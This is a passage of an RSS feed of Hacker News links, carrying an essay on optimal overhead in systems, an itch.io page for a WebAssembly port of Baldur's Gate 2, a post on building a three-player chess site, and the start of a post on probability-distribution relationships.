</p><h2 id="conclusion">Conclusion</h2><p>If you find that CLIP's performance is not as high as you would like, you may still want to consider <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">training a custom image classification model with supervision</a>.</p><p>For more on CLIP research, consider reading <a href="https://cdn.openai.com/papers/Learning_Transferable_Visual_Models_From_Natural_Language_Supervision.pdf">the paper</a> and checking out <a href="https://openai.com/blog/clip/">OpenAI's blog post</a>. And we'd love to hear if you discover anything interesting when playing around with the model! Be sure to <a href="https://twitter.com/roboflowai">drop us a line on twitter</a>.</p><p>As always, happy inferencing!</p></div>
                
              </div>
            </div></div>]]>
            </description>
            <link>https://blog.roboflow.com/how-to-use-openai-clip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687532</guid>
            <pubDate>Fri, 08 Jan 2021 17:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Drives Optimal Overhead?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687485">thread link</a>) | @swyx
<br/>
January 8, 2021 | https://www.swyx.io/optimal-overhead/ | <a href="https://web.archive.org/web/*/https://www.swyx.io/optimal-overhead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>What determines the optimal amount of overhead in a system?</strong></p>
<p>This question has been bothering me ever since I began my informal study of computer and human systems. Systems thinkers are usually very thoughtful types, but as far as I can tell nobody's answered it yet.</p>
<p>This strikes me as odd, because it is an <em>incredibly</em> important number to manage.</p>
<p>
  <img src="https://dev-to-uploads.s3.amazonaws.com/i/c1o3owg0liv43ixque75.png" alt="Optimal Overhead drawing">
</p>
<section>
  <h2 id="defining-overhead"><a href="#defining-overhead">Defining Overhead</a></h2>
  <p>I use the word in the conceptual sense here, closer to <a href="https://stackoverflow.com/questions/2860234/what-is-overhead">StackOverflow</a> than <a href="https://en.wikipedia.org/wiki/Overhead_(computing)">Wikipedia</a>. I'm pretty poor at defining things – but it's important, so here's my attempt:</p>
  <p>Pretend your job is to do as much as possible of a certain task (producing <strong>output</strong>), given limited resources (<em>time, CPU, memory, bundle size, people...</em>). <strong>Overhead</strong> is the percentage of resources you spend <strong>not</strong> directly producing — in order to do <em>produce even more</em> with the remaining resources.</p>
  <p>Sometimes overhead is also known as "footprint".</p>
</section>
<section>
  <h2 id="some-examples"><a href="#some-examples">Some Examples</a></h2>
  <p>Before I lose you, here are some examples of overhead (of course, these are very imprecise, just roll with it):</p>
  <ul>
    <li><strong>Operating Systems</strong>: We could run our apps on "bare metal", but we don't. In this case the goal isn't necessarily running the most apps or running them the fastest; we use OSes to improve user and developer experience.
      <ul>
        <li>Windows 10's <a href="https://howmonk.com/how-much-cpu-usage-is-normal/">idle CPU usage is 2-4%</a> (high variability)</li>
        <li>MacOS is less conclusive, maybe <a href="https://apple.stackexchange.com/a/377067">6%</a> (high variability)</li>
        <li>iOS "System Storage" takes up <a href="https://www.imyfone.com/iphone-space-saver/ios-storage-management/#:~:text=The%20%E2%80%9CSystem%E2%80%9D%20storage%20is%20the,64GB%20iPhone%20would%20be%209GB.">25% of a 16GB iPhone</a> (less with more memory)</li>
      </ul>
    </li>
    <li><strong>Virtualization</strong> has between <a href="https://serverfault.com/questions/261974/how-much-overhead-does-x86-x64-virtualization-have">9-35% overhead</a> (or <a href="https://serverfault.com/questions/135431/is-virtual-machine-slower-than-the-underlying-physical-machine">1-5% of CPU and 5-10% Memory</a>). Docker has <a href="https://stackoverflow.com/questions/21889053/what-is-the-runtime-performance-cost-of-a-docker-container">minimal performance overhead</a> and it seems so does <a href="https://www.researchgate.net/figure/Performance-overhead-of-Kubernetes-and-Docker-Swarm-in-comparison-to-VM-Docker-and_fig2_329830385">Kubernetes</a> (the learning curve overhead is a different question, discussed below).</li>
    <li>Cloudflare Workers <a href="https://blog.cloudflare.com/introducing-workers-unbound/">abandon containers for isolates</a>. If you believe the image shown, the process overhead inverts from ~90% to ~10%.
      <ul>
        <li>Obviously the image is not drawn to scale, but it's clear the overhead reduction is large (<em>If you're a knowledgeable reader, I'd love to get actual ballpark numbers on this</em>)</li>
      </ul>
    </li>
    <li>React takes about 8% of compute in apps, <a href="https://twitter.com/sebmarkbage/status/1201251406604197888?s=20">by FB's own numbers</a></li>
    <li>1 Manager should support 6-8 engineers, says <a href="https://lethain.com/sizing-engineering-teams/">Will Larson</a>. Aka 12.5% to 16.7% overhead.</li>
    <li>Cal Newport <a href="https://www.calnewport.com/blog/2013/12/21/deep-habits-the-importance-of-planning-every-minute-of-your-work-day/">takes 10-20 minutes to plan out every work day</a>. Assuming an 8hr work day, that's just a 3% overhead.</li>
    <li>Every entrepreneur struggles with the balance between "working ON the business" and "working IN the business" (coined by <a href="https://www.quora.com/What-is-the-difference-between-working-in-the-business-and-working-on-the-business">Michael Gerber</a>). I think a ratio of 1:4 works well (say <a href="https://davidcummings.org/2015/11/08/working-in-the-business-vs-on-the-business/">10%</a>-<a href="https://makersbusinesstoolkit.com/working-on-your-business-and-working-in-your-business/">25%</a> overhead in reality).</li>
  </ul>
</section>
<section>
  <h2 id="too-much-or-too-little"><a href="#too-much-or-too-little">Too Much, or Too Little?</a></h2>
  <p>We don't directly care about how much overhead we use; we just want to maximize output. But clearly everything about how we plan and do our jobs will be wildly different depending on whether optimal overhead is 5% or 50%. (This can serve as a very useful filter for choosing tech and architecture, for example.)</p>
  <p>Increasing overhead often makes sense. This goes by many names: <a href="https://www.mckinsey.com/business-functions/organization/our-insights/the-organization-blog/slowing-down-to-speed-up">Slow down to speed up</a>. <a href="https://www.franklincovey.com/the-7-habits/habit-7/">Sharpen the saw</a>. <a href="https://xkcd.com/1319/">Automate repeated tasks</a>.</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/s0juvjpuholarztbyfx8.png" alt="Alt Text">
  </p>
  <p>But sometimes the overhead isn't worth it, and we can't tell. Sometimes we should just be doing the thing rather than doing setup to do the thing. You see variants of this debate all over the place, from <a href="https://svelte.dev/blog/virtual-dom-is-pure-overhead">Virtual DOM is pure overhead</a> to <a href="http://paulgraham.com/ds.html">Do Things That Don't Scale</a>.</p>
  <p>By definition, <strong>overhead is indirectly linked to output</strong>. This link can be nonlinear, and noisy:</p>
  <ul>
    <li>Imagine if you were taught to keep 30% overhead, but decided to try dropping down to 10%, and observed <strong>no change</strong> in output efficiency. (<a href="https://www.inputmag.com/culture/uber-burned-through-100-million-thanks-to-digital-ad-fraud">like Uber did</a>)</li>
    <li>You would go from spending 70% of your resources producing, to 90% of your resources producing, with the same output per resource. This would be <strong>a 29% increase</strong> in output you've been missing out on the entire time! You'd be pissed!</li>
    <li>And then imagine if someone else did it and got completely different results instead — and everyone was okay with it. No further study conducted.</li>
  </ul>
  <p><strong>That's our state of understanding of overhead in systems as of today.</strong></p>
  <p>This is closer to how real life overhead charts might look like:</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/s8o529o897x1z2vmyx4h.png" alt="Alt Text">
  </p>
  <p>Imagine if we had a "Science of Overhead". I'd settle for just being able to do <a href="https://github.com/sirupsen/napkin-math">napkin math</a> on it. A ballpark range for overhead would reduce our uncertainty and help us find optimal (or tolerable, see below) overhead.</p>
</section>
<section>
  <h2 id="determinants"><a href="#determinants">Determinants</a></h2>
  <p><strong>I don't have an answer.</strong> This post is me thinking aloud. But here are some hypotheses I am exploring.</p>
  <section>
    <h3 id="big-o"><a href="#big-o">Big O</a></h3>
    <p>Overhead is governed by Big O as well. It's not super meaningful to measure the storage overhead of an operating system in percentages, because it is a fixed size - O(1).</p>
    <p>You can make an argument that virtualization overhead scales O(N) with N being the number of VMs.</p>
    <p>Anything involving networking and communication suffers combinatorial/Metcalfe's law explosion, leading to nonlinearly increasing O(N^2) or worse inefficiency.</p>
  </section>
  <section>
    <h3 id="learning-curve"><a href="#learning-curve">Learning Curve</a></h3>
    <p>A unique form of overhead is something you can pay once and amortize <em>across repeated projects</em>, instead of only having a useful life of one project. This is known as a <strong>learning curve</strong>.</p>
    <p>All frameworks bear this sort of overhead: For any one project, you might be able to get things done faster AND have faster running code, if you just did the project using "vanilla" code instead of learning the framework and then doing the project. You only see the benefits down the line once you work on multiple similar projects.</p>
    <p>You might also then overinvest in the framework, only to find out that other projects aren't a fit, or, vice versa, the framework doesn't scale for your needs in some unforeseen way.</p>
    <p>There are two unknowns to learn:</p>
    <ul>
      <li>learning about the problem</li>
      <li>learning about various solutions</li>
    </ul>
    <p>One very good reason to use a framework is that it encodes more knowledge about the problem than you may have. But it can also be a crutch that gets in the way of you learning about the problem in the first place. And when you know enough about the problem and enough about the limitations of existing solutions, you may be forced to make your own.</p>
    <p><strong>All of this is very familiar to experienced programmers.</strong></p>
    <p><strong>And all of this is (tiresome, sometimes very unproductive) overhead.</strong></p>
    <p>The primary challenge of "learning curve" type overhead isn't the amortization math. This is intuitive.</p>
    <p>What is particularly intractable is <a href="https://en.wikipedia.org/wiki/Knightian_uncertainty">Knightian uncertainty</a> around <strong>not knowing what you don't know</strong>. By definition, if you haven't learned it yet, you may not really know how to evaluate it fully and have to rely on secondhand reports and endorsements.</p>
    <p>I hold out faith that this is a manageable, if not solvable problem. I have a strong suspicion that becoming a technical or people leader <strong>means</strong> developing some skill in managing for unknowns. It is a truism that scaling yourself, beyond just you, means you have to manage people whose jobs you have never done and technologies whose alternatives you have never used.</p>
    <blockquote>
      <p>Note: Done badly, the above can be a particularly loathsome form of <a href="https://www.newyorker.com/books/under-review/the-bullshit-job-boom">bullshit job</a>. And yes — this includes product management and blogging — both roles that I perform. Always beware <a href="https://www.epsilontheory.com/gell-mann-amnesia/">Gell-Mann Amnesia</a>.</p>
    </blockquote>
  </section>
  <section>
    <h3 id="humans-vs-machines"><a href="#humans-vs-machines">Humans vs Machines</a></h3>
    <p>You might be tempted to conclude that human systems naturally have higher overhead, as I was. Joel Spolsky's discussion of <a href="https://www.joelonsoftware.com/2006/04/11/the-development-abstraction-layer-2/">Development Abstraction Layers</a> noted:</p>
    <blockquote>
      <p>"It is not a coincidence that the Roman army had a ratio of four servants for every soldier. This was not decadence. Modern armies probably run 7:1."</p>
    </blockquote>
    <p><a href="https://lethain.com/">Will Larson</a> also commented that <a href="https://www.bbc.com/worklife/article/20191107-the-law-that-explains-why-you-cant-get-anything-done">Parkinson's Law originated from a similar observation that the British Navy's bureaucracy</a> kept growing at the same rate regardless of the underlying work declining by 2/3rds.</p>
    <blockquote>
      <p>Side note: <a href="https://xdg.me/">David Golden</a> notes that military <a href="https://en.wikipedia.org/wiki/Tooth-to-tail_ratio">"tooth to tail"</a> ratios aren't really the same thing as overhead.</p>
    </blockquote>
    <p>But it's not always true. The US civil service is about 2% of the overall US labor force (you may be surprised to find, as I was, that Singapore's equivalent "overhead" is ~4%). Something that some operating systems would be proud of.</p>
  </section>
</section>
<section>
  <h2 id="tolerable-overhead"><a href="#tolerable-overhead">Tolerable Overhead</a></h2>
  <p>Perhaps it is too much of an optimization exercise to aim for <em>optimal</em> overhead, given how noisy this whole process is. A lower bar we can aim for is <strong>Tolerable Overhead</strong>, suggested by <a href="https://xdg.me/">David Golden</a>. To me this is like a "first do no harm" principle of overhead - make sure you are at least no less productive with overhead than you were without it.</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/v1vigbjn6g13d7qhi30t.png" alt="Alt Text">
  </p>
</section>
<section>
  <h2 id="postscript-redundancy-vs-overhead"><a href="#postscript-redundancy-vs-overhead">Postscript: Redundancy vs Overhead</a></h2>
  <p>You can find examples of "redundancy" everywhere in distributed systems. MongoDB recommends <a href="https://docs.mongodb.com/manual/core/replica-set-architecture-three-members/">3 member replica sets</a>, but Google famously requires <a href="https://dataskeptic.libsyn.com/byzantine-fault-tolerant-consensus">5 nodes for fault tolerance</a>. Of course by nature these are &gt;100% numbers - and <a href="https://xdg.me/">David Golden</a> rightly pointed out to me that they aren't comparable to overhead.</p>
</section>
<section>
  
  <p>I will update this post with more reads and numbers as I come across them. Ultimately I'd like to achieve a good reference table like this epic <a href="https://danluu.com/input-lag/">Dan Luu post on Computer Latency</a>.</p>
  <p>I did a fun talk about <a href="https://www.youtube.com/watch?v=atOIxTHylF8">Svelte and the Great Space Elevator</a> where I discussed how we pay for overhead in frontend frameworks.</p>
</section>
</div></div>]]>
            </description>
            <link>https://www.swyx.io/optimal-overhead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687485</guid>
            <pubDate>Fri, 08 Jan 2021 17:52:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Baldur's Gate 2 reincarnated in the browser using WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25687261">thread link</a>) | @yuri91
<br/>
January 8, 2021 | https://browser-games.itch.io/baldursgate2 | <a href="https://web.archive.org/web/*/https://browser-games.itch.io/baldursgate2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="inner_column"><div id="header"><p><img alt="Baldur's Gate 2 Demo (Web Edition)" src="https://img.itch.zone/aW1nLzMzOTMyMDYuanBn/original/ymT9Bf.jpg"></p></div><div id="view_html_game_page_79154"><div id="html_embed_widget_85503"><div data-height="800" data-width="1000"></div></div><div><div><div><p>Link to Discord community:&nbsp;<a href="https://discord.gg/zUSZ3T8" rel="nofollow noopener">https://discord.gg/zUSZ3T8</a></p></div><div><div><span>More information<svg height="6" width="12" role="img" aria-hidden="" viewBox="0 0 37 20" version="1.1"><path d="m2.0858 0c-1.1535 0-2.0858 0.86469-2.0858 1.9331 0 0.5139 0.21354 1.0183 0.38704 1.1881l18.113 16.879 18.112-16.879c0.174-0.1696 0.388-0.674 0.388-1.1879 0-1.0684-0.932-1.9331-2.086-1.9331-0.577 0-1.111 0.23008-1.49 0.57992l-14.924 13.894-14.925-13.893c-0.3777-0.34998-0.9134-0.581-1.4902-0.581z"></path></svg></span></div><div><div><table><tbody><tr><td>Updated</td><td><abbr title="08 January 2021 @ 18:16"><span></span> 2 days ago</abbr></td></tr><tr><td>Status</td><td><a href="https://itch.io/games/released">Released</a></td></tr><tr><td>Platforms</td><td><a href="https://itch.io/games/html5">HTML5</a></td></tr><tr><td>Author</td><td><a href="https://browser-games.itch.io/">browser games</a></td></tr><tr><td>Genre</td><td><a href="https://itch.io/games/genre-rpg">Role Playing</a></td></tr></tbody></table></div></div></div><div><h2 id="comments">Leave a comment</h2><p><a href="https://itch.io/login?return_to=https%3A%2F%2Fbrowser-games.itch.io%2Fbaldursgate2" data-register_action="comment">Log in with itch.io</a> to leave a comment.</p><div id="community_topic_posts_widget_70258"></div></div></div><div><p><a href="https://img.itch.zone/aW1nLzMzNTc4NzIuanBn/original/Eh%2FX49.jpg" target="_blank" data-image_lightbox="true"><img src="https://img.itch.zone/aW1nLzMzNTc4NzIuanBn/347x500/O3hTpf.jpg"></a></p></div></div></div><div id="view_game_footer"><a href="https://itch.io/"><svg height="17" width="20" role="img" aria-hidden="" viewBox="0 0 262.728 235.452" version="1.1"><path d="M31.99 1.365C21.287 7.72.2 31.945 0 38.298v10.516C0 62.144 12.46 73.86 23.773 73.86c13.584 0 24.902-11.258 24.903-24.62 0 13.362 10.93 24.62 24.515 24.62 13.586 0 24.165-11.258 24.165-24.62 0 13.362 11.622 24.62 25.207 24.62h.246c13.586 0 25.208-11.258 25.208-24.62 0 13.362 10.58 24.62 24.164 24.62 13.585 0 24.515-11.258 24.515-24.62 0 13.362 11.32 24.62 24.903 24.62 11.313 0 23.773-11.714 23.773-25.046V38.298c-.2-6.354-21.287-30.58-31.988-36.933C180.118.197 157.056-.005 122.685 0c-34.37.003-81.228.54-90.697 1.365zm65.194 66.217a28.025 28.025 0 0 1-4.78 6.155c-5.128 5.014-12.157 8.122-19.906 8.122a28.482 28.482 0 0 1-19.948-8.126c-1.858-1.82-3.27-3.766-4.563-6.032l-.006.004c-1.292 2.27-3.092 4.215-4.954 6.037a28.5 28.5 0 0 1-19.948 8.12c-.934 0-1.906-.258-2.692-.528-1.092 11.372-1.553 22.24-1.716 30.164l-.002.045c-.02 4.024-.04 7.333-.06 11.93.21 23.86-2.363 77.334 10.52 90.473 19.964 4.655 56.7 6.775 93.555 6.788h.006c36.854-.013 73.59-2.133 93.554-6.788 12.883-13.14 10.31-66.614 10.52-90.474-.022-4.596-.04-7.905-.06-11.93l-.003-.045c-.162-7.926-.623-18.793-1.715-30.165-.786.27-1.757.528-2.692.528a28.5 28.5 0 0 1-19.948-8.12c-1.862-1.822-3.662-3.766-4.955-6.037l-.006-.004c-1.294 2.266-2.705 4.213-4.563 6.032a28.48 28.48 0 0 1-19.947 8.125c-7.748 0-14.778-3.11-19.906-8.123a28.025 28.025 0 0 1-4.78-6.155 27.99 27.99 0 0 1-4.736 6.155 28.49 28.49 0 0 1-19.95 8.124c-.27 0-.54-.012-.81-.02h-.007c-.27.008-.54.02-.813.02a28.49 28.49 0 0 1-19.95-8.123 27.992 27.992 0 0 1-4.736-6.155zm-20.486 26.49l-.002.01h.015c8.113.017 15.32 0 24.25 9.746 7.028-.737 14.372-1.105 21.722-1.094h.006c7.35-.01 14.694.357 21.723 1.094 8.93-9.747 16.137-9.73 24.25-9.746h.014l-.002-.01c3.833 0 19.166 0 29.85 30.007L210 165.244c8.504 30.624-2.723 31.373-16.727 31.4-20.768-.773-32.267-15.855-32.267-30.935-11.496 1.884-24.907 2.826-38.318 2.827h-.006c-13.412 0-26.823-.943-38.318-2.827 0 15.08-11.5 30.162-32.267 30.935-14.004-.027-25.23-.775-16.726-31.4L46.85 124.08c10.684-30.007 26.017-30.007 29.85-30.007zm45.985 23.582v.006c-.02.02-21.863 20.08-25.79 27.215l14.304-.573v12.474c0 .584 5.74.346 11.486.08h.006c5.744.266 11.485.504 11.485-.08v-12.474l14.304.573c-3.928-7.135-25.79-27.215-25.79-27.215v-.006l-.003.002z"></path></svg></a><p><a href="https://itch.io/">itch.io</a><span>·</span><a href="https://browser-games.itch.io/">View all by browser games</a><span>·</span>Report<span>·</span>Embed<span>·</span></p><p>Updated <abbr title="08 January 2021 @ 18:16"> 2 days ago</abbr></p><div><p><a href="https://itch.io/games">Games</a> › <a href="https://itch.io/games/genre-rpg">Role Playing</a> › <a href="https://itch.io/games/free">Free</a></p></div></div></div></div></div>]]>
            </description>
            <link>https://browser-games.itch.io/baldursgate2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687261</guid>
            <pubDate>Fri, 08 Jan 2021 17:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a three-player chess website]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687228">thread link</a>) | @Smlep
<br/>
January 8, 2021 | https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html | <a href="https://web.archive.org/web/*/https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="context">Context</h2>

<p>Around the end of 2019, as we were going through our few last months of
engineering school, we ended up having a quite consequent amount of free
time due to the highly irregular organisation of courses throughout the year.</p>

<p>Daniel, a friend of mine from school who has
been a huge fan of chess for a while now told us one night about how he read 
about this chess variant with three players and how he thought it would be
interesting to build a game engine for it.</p>

<p>Since I had time to <del>waste</del> spend building something <del>funny</del> meaningful,
I was interested in getting involved in this project to make it grow and be
something more than only a game engine (which I thought nobody would use
anyway, since playing chess through command line on a single computer does not
seem that appealing).</p>

<p>That’s how, Daniel, Vincent (another friend from school with whom I had
worked on many side projects), and I decided that we were going to build a
website so that people could come and play chess with two of their
friends.</p>

<h2 id="what-is-three-player-chess">What is three-player chess?</h2>

<p>Some might wonder what really is 3-player chess, do the rules change
when introducing a third player, and if they do, how?</p>

<p>Even though 3-player chess seems like a simple and precise concept, there are many variations
with light differences and not one set of rules for 3-player chess. These different
variations come in variants with different names (Trichess, Chess for three, Three-Player
Chess, Yalta chess…) but not every mention of one variant describes the same rules and
there is a huge lack of norm here.</p>

<p>The variation of chess played on <a href="https://yalta-chess.com/">yalta-chess.com</a> can be
considered as a unique variant, but mostly inspired by <strong>Yalta Chess</strong> (not much suspense
here) from which we tried to follow the rules as much as possible, but once again, the rules
differed depending on the articles.</p>

<p>On our website, you’ll play on a 96-cell board (32 for each player, just like usual chess).</p>

<p><img src="https://smlep.github.io/assets/yalta-animation4.gif" alt="Yalta board"></p>

<p>The moves are the same as classic chess, but it can take some time to get used to the
moves around the center or the board when starting to play <strong>Yalta Chess</strong>. The only real difference
with 2-player chess is how winners and losers are handled.</p>

<p>The winner is the first player to checkmate another player, meaning that there are one
winner and two losers. This makes the game more interesting, rewarding aggressive strategies
since playing too defensive might end up in a loss where one of the other players checkmated
the third player.</p>

<h2 id="early-development">Early development</h2>

<p>Our initial goal was pretty simple and seemed easy to accomplish, the
tasks which needed to be done could have been summed up as:</p>

<ul>
  <li>Building a game engine, implementing every rule and move.</li>
  <li>Having a game page on which 3 players could play together with a decent user
experience.</li>
  <li>Having a basic matchmaking system, so that players could join games easily.</li>
</ul>

<p>It looked easy and fast, the game engine was the main challenge since the special
shape of the board made the classic 2-player chess implementation unsuitable for
our needs and we needed to come up with a smart way to handle the board. Once the
game engine was out of the way, the only remaining thing would be to build a simple
website with basic functionalities.</p>

<p>Two of us already had some web development knowledge which we acquired through previous
side-projects, I would not say that we were <strong>amazing</strong> (or good) web developers,
but we were at least decent. Well, for the backend at least, our UI/UX level was (and
still is, but those who saw the website already know that) pretty bad.</p>

<p>Since we weren’t looking for high performances in our game engine because a few
milliseconds were not going to impact the user experience, building the engine was
actually pretty fast. One of us focused on it, and after a few days we had a game engine
implementing the rules and about everything we needed except <em>promotions</em>, <em>castling</em>, and
<em>en passant</em> which came later.</p>

<p>Our implementation relied on the fact that instead of using one 8x8 board as in 2-player
chess, we considered the board as 3 distinct 4x8 sub-boards, each sub-board filled with a
different color on the example below: 
<img src="https://smlep.github.io/assets/yalta-subboards.png" alt="Yalta debug mode"></p>

<p>The website, on the other hand, was way more complicated than we anticipated, handling
concurrent plays with real-time information transfer between the players (without
refreshing after each move) and implementing a decent user experience was much more
challenging than we expected.</p>

<p>Our first playable version looked like this:</p>

<p><img src="https://smlep.github.io/assets/yalta-debug.gif" alt="Yalta debug mode"></p>

<p>With the three boards representing the three sides of the board as explained above.</p>

<p>This first version allowed us to check that our engine worked as intended, but
required us to refresh a page to see the other players’ moves and wasn’t very user friendly.</p>

<p>That’s when we really became aware that the website part of the project would require
an amount of work strongly higher than the game engine implementation.</p>

<h2 id="a-basic-project">A basic project</h2>

<p>The more we implemented new features on our website, the more features we thought about
which seemed to be required to have a decent user experience on the website. Some of these features
were not necessary but seemed like good ideas/interesting to implement so we implemented some of them
and the others were listed and put aside for later.</p>

<p>After a few weeks, we had a decent result for the play part of the website; three players could
play on the same page, moving by selecting a piece and moving it to its location and seeing the actions’
results in real-time.</p>

<p>Our first <em>matchmaking</em> system was fairly basic, there was a list of created games, and any player
could join any game, if the user was the third player to join a game, it would start, and if there were
3 players already in the game, the user would be considered as a spectator. On top of that, any user
could create a new game.</p>

<p>At this time we had already spent way more time on this project than we thought we were going to,
even though we had only implemented the features we thought were necessary to have a good time
playing the game. The website’s current state was enough to send the link to some friends and play
games with them if we wanted to, the global design of the website wasn’t nice, but playing stayed pretty intuitive.</p>

<p><img src="https://smlep.github.io/assets/yalta-landing-1.png" alt="Landing page"></p>

<h2 id="not-so-basic-anymore">Not so basic anymore</h2>

<p>When we started this project, we did not define the real scope of users who would use it,
the more we worked on it and the more features we started implementing, the more we started to
want to make it public so that everyone could come and play.</p>

<p>As we started having less free time due to school projects and then the real jobs we got
after graduating, we spent way less time developing this project the following months but we kept working
on it and added a lot of new sfeature. Some of those being necessary for a public release,
some that we felt were a really nice addition for users and some which might just be
really useless (Hello, in-game chat). Among these extra-features are:</p>

<ul>
  <li>A custom game system to play with friends with custom settings</li>
  <li>A public queue system to play with random unknown players</li>
  <li>A training mode to play against bots in different difficulties</li>
  <li>A profile system with ranks, elo, skins, themes, and statistics</li>
  <li>Game timers</li>
  <li>A board rotation system, to see the board as one of your opponents</li>
  <li>An in-game chat</li>
  <li>The possibility to show replays of games</li>
  <li>A documentation section to explain the website and the game rules</li>
  <li>A landing page to explain to new users what happens here</li>
  <li>A new implementation of the game engine with improved performances
and a graph system (replacing the 3x4x8 sub-boards implementation)</li>
</ul>

<p>And of course, a landing page to welcome new players to our website.
The old matchmaking system based on a game list was removed, since the public
queue and private game system fully replaced the need for it.</p>

<p><img src="https://smlep.github.io/assets/yalta-ways-to-play.png" alt="Ways to play"></p>

<h2 id="costs-and-revenues">Costs and revenues</h2>

<p>As we added new features and new services which started to increase potential costs, we had to
consider the <em>business</em> aspect of the website. We were not fully against trying to monetize it but
we did not want this to impact the user experience, driving potential users away because of
<em>aggressive advertising</em> or <em>pay-to-win</em> systems.</p>

<p>We considered <strong>ads</strong>, but generic ads (such as adsense) would require to have a huge 
amount of traffic to really generate money and they usually don’t fit well into a website. We did
not want our website to get significantly less enjoyable for users just to win a few euros every month (or year).</p>

<!--
Another thing we considered was to bring premium content to the website, allowing users to purchase
differents assets such as skin. The issue with this solution is that it is really hard to find good
content which will not impact the other users impact experience.
We did implement a skin system, so that players could update the apparences of their pieces, so that
we could set up a system where the users would be able to buy these apparences. But the impact on the
other players which were just trying to focus would be too high, who wants to start a game and be
matched again a player with flashy purple pieces?
There are options to prevent this scenario such as adding a button to hide every opponents skin, but
players won't buy skins if the other players can't see it.
-->

<p>We considered some other solutions than ads but in the end, <strong>we did not find an adequate business model</strong>.
Not being able to generate revenue is not currently an issue, since the goal never was to quit our jobs and
start working on this project every day of the week. Nevertheless, we did not anticipate when we started this
project (before we decided to add many unexpected features) that there were gonna be real costs to run
the website.</p>

<p>Indeed, the website now runs using many different services and tools which come with a cost, meaning
that we cannot sustain with this business model (which is not one, since we generate no revenue) if
our user count grows too much.</p>

<p>As long as our monthly costs stay under a few dozen of euros, it is
fine, I’d say that we are happy to pay for it if some people are happy to play on
<a href="https://www.yalta-chess.com/">yalta-chess.com</a>. But if this website became too popular, we would have
to scale up the different services we pay for (hosting, Redis, database…), resulting in hundreds of
euros bills.</p>

<p>Hence, if too many people end up enjoying our website, at some point we will have to <strong>shut it
down</strong> (or strongly restrict traffic) if we still cannot generate revenue.</p>

<p>This is really <strong>unlikely</strong> to happen since we don’t plan on doing real advertising for this project,
and we are not so presumptuous as to think that this website is good enough to deserve this much 
success. But we still have to consider this scenario, and if it happens we will still try to consider
ways to generate revenue, we are not fully closed to ads, but we feel like right now nothing …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html">https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html</a></em></p>]]>
            </description>
            <link>https://smlep.github.io/jekyll/update/2020/12/26/yaltachess.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687228</guid>
            <pubDate>Fri, 08 Jan 2021 17:34:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Map of Randomness]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687087">thread link</a>) | @lolptdr
<br/>
January 8, 2021 | https://www.telescopic-turnip.net/cookbooks/the-map-of-randomness/ | <a href="https://web.archive.org/web/*/https://www.telescopic-turnip.net/cookbooks/the-map-of-randomness/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1333">
		<!-- .entry-header -->

	
	<div>
		
<p>In <a href="https://doi.org/10.1198/000313008X270448">this paper from 2012</a> (full text <a href="https://www.telescopic-turnip.net/documents/articles/leemis2012.pdf">here</a>), Leemis and McQueston show a diagram of how probability distributions are related to each other. As I liked it really much, I extracted the chart from the pdf, turned it into a poster, and printed a giant version of it to stick on the wall of my apartment. I thought I would also share it here:</p>



<figure><img src="https://www.telescopic-turnip.net/documents/figures/distributions.png" alt=""></figure>



<p>The full-size vector graphic version (as pdf) can be downloaded <a href="https://www.telescopic-turnip.net/documents/figures/distributions.pdf">here</a>.</p>



<h3>Some explanation</h3>



<p>Things can be random in many different ways. It’s tempting to think “if it’s not deterministic, then it’s random and we don’t know anything about it”, but that would be wrong. There is an entire bestiary of probability distributions, with different shapes and different properties, that tell you how likely the possible outcomes are relative to each other. What’s interesting is that each distribution describes the outcome of a particular class of stochastic processes, so by looking at how something is distributed, it’s possible to understand better the process that created it. One can even combine simple processes together or morph their parameters to build more complicated processes. <em>The map above tells you how the probability distribution changes when you do that. </em></p>



<p>Let’s look at an example. You are typing on a keyboard. Every time you push a button, there is a certain probability <em>p</em> that you will hit the wrong one. This super simple process is called the <a href="https://en.wikipedia.org/wiki/Bernoulli_process">Bernoulli process</a>, it corresponds to the Bernoulli distribution that you can find near the top-right corner of the map. Now you type a whole page, consisting of <em>n</em> characters. How many errors will you make? This is just a sum of <em>n</em> Bernoulli processes, so we look at the map and follow the arrow that says <span data-katex-display="false">\sum{X_i}</span>, and we reach the binomial distribution<sup data-mfn="1">1</sup><span data-mfn="1">i.i.d. means “Independent and Identically Distributed”. We are assuming your typos are independent from each other.</span>. The number of errors per page follows a binomial distribution with mean <em>np</em> and variance <em>np(1-p)</em>. If you write a book with 1000 characters per page and make one typo per hundred characters, the variance of the number of typos from page to page will be 1000*0.01*0.99=9.9<sup data-mfn="2">2</sup><span data-mfn="2">ISN’T THAT FASCINATING?</span>.</p>



